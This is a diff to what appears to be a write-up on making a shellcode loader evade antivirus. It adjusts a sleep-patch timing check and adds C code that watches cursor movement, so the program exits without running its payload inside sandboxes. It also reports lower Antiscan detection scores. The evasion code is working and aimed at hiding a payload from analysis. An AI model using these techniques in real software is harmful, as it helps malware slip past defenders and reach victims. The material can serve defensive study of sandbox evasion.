@@ -241,7 +241,7 @@ int __check_sleep_patch(){
 
     DWORD timeSpan = endCount - startCount;
     if ((L_INTERVAL > timeSpan) && (timeSpan > U_INTERVAL)){
-        return 0;
+        return -1;
     }
     
     return 0;
@@ -262,3 +262,66 @@ Okay, so this did not help much with the detection rates but nevertheless, is a 
 [**Antiscan Score: x/26**]()
 
 ![Level2 Analysis]()
+
+## Level 3 - Where is the cursor?
+
+Again, instead of tampering with the shellcode itself, we are employing some more sandbox detection techniques. This time, we are monitoring for User Input, which in this case, is the cursor movement as such:
+```c
+int __check_cursor_activity(){
+    int __infinity_loop = 0;
+    POINT p1, p2;
+    BOOL res1, res2;
+    HDESK desktop_handle;
+
+    // Switch to input desktop if different from current one
+    desktop_handle = OpenInputDesktop(0, TRUE, GENERIC_READ);
+    SetThreadDesktop(desktop_handle);
+
+
+    // The GetCurorPos() can fail at times so just retry it 5 times and 
+    // if it still fails, then exit out with an error code
+    while(1){
+        res1 = GetCursorPos(&p1);
+        if (res1) break;
+        Sleep(INTERVAL);
+        __infinity_loop += 1;
+        if (__infinity_loop == 5) return FALSE;
+    }
+    __infinity_loop = 0;
+    Sleep(INTERVAL*10);
+
+    while(1){
+        res2 = GetCursorPos(&p2);
+        if (res2) break;
+        Sleep(INTERVAL);
+        __infinity_loop += 1;
+        if (__infinity_loop == 5) return FALSE;
+    }
+
+    if (res1 && res2){
+        if (p1.x==p2.x || p1.y == p2.y || ((p1.x-p2.x)==(p1.y-p2.y))){
+            return FALSE;
+        }
+        else {
+            return TRUE;
+        }
+    }
+    else{
+        return FALSE;
+    }
+
+}
+
+```
+
+We are keeping a track of the Cursor position. If the cursor doesn't move for a while then we exit out of the program without running any of that suspicious shell code.
+
+
+### Antiscan Analysis
+
+This seemed to have drastically bring down the detection scores. Thats's a huge improvement considering the barely tampered with payload. 
+
+[**Antiscan Score: x/26**]()
+
+![Level3 Analysis]()
+
